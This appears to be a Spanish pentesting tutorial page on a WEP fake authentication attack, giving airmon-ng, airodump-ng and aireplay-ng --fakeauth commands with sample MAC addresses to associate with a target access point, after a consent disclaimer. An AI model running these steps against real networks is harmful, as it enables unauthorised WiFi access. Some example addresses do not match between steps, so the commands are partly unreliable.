
# Fake Autentication

{% hint style="danger" %}
**Disclaimer:** Vamos a realizar ataques a redes WiFi, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Factores</mark>&#x20;

Este ataque se puede usar cuando:

* No hay mucho tráfico en la red víctima
* Toma mucho tiempo capturar IVs

Para esto debemos asociarnos con el AP (Access Point) para generar tráfico

### 1. Apagar adaptador wlan0

```bash
ifconfig wlan0 down
```

### 2. Iniciamos airmon-ng

```bash
sudo airmon-ng start wlan0
```

### 3. Encontrar al objetivo

```bash
sudo airodump-ng wlan0
```

<figure><img src="/files/Kg5buwIQC1FdlfycPYQN" alt=""><figcaption></figcaption></figure>

### 4. Iniciar airodump

Debemos guardar la salida con `--write`

```bash
# 4 - Iniciamos airodump-ng y guardamos la salida
sudo airodump-ng --bssid 00:E0:4C:6A:5A:F8 --channel 11 --write fake_auth wlan0
```

<figure><img src="/files/KFScOscZYn5AY3wKSsuh" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Observamos que hay muy poco tráfico en la red
{% endhint %}

{% hint style="warning" %}
**Importante:** mantener abierto mientras se ejecuta aireplay-ng
{% endhint %}

### 5. Iniciar aireplay-ng

```bash
sudo aireplay-ng --help

Attack modes (numbers can still be used):

      --deauth      count : deauthenticate 1 or all stations (-0)
  >>  --fakeauth    delay : fake authentication with AP (-1)
      --interactive       : interactive frame selection (-2)
      --arpreplay         : standard ARP-request replay (-3)
      --chopchop          : decrypt/chopchop WEP packet (-4)
      --fragment          : generates valid keystream   (-5)
      --caffe-latte       : query a client for new IVs  (-6)
      --cfrag             : fragments against a client  (-7)
      --migmode           : attacks WPA migration mode  (-8)
      --test              : tests injection and quality (-9)
```

```bash
sudo aireplay-ng --fakeauth 0 -a <SSID-OBJETIVO> -h <MAC-ADAPTADOR> <INTERFAZ> 
```

```bash
sudo aireplay-ng --fakeauth 0 -a 00:E0:AC:6A:5A:F8 -h E8:4E:06:35:A9:C0 wlan0mon 
```

<figure><img src="/files/uu18k03Kpk6xsZiKiQjX" alt=""><figcaption></figcaption></figure>

Volviendo a airodump vemos que hemos hecho correctamente el fake auth. No nos ha pedido contraseña para loguearnos y estamos conectados a la red objetivo.

<figure><img src="/files/axpjNHM8vknG4FlUBsnw" alt=""><figcaption></figcaption></figure>
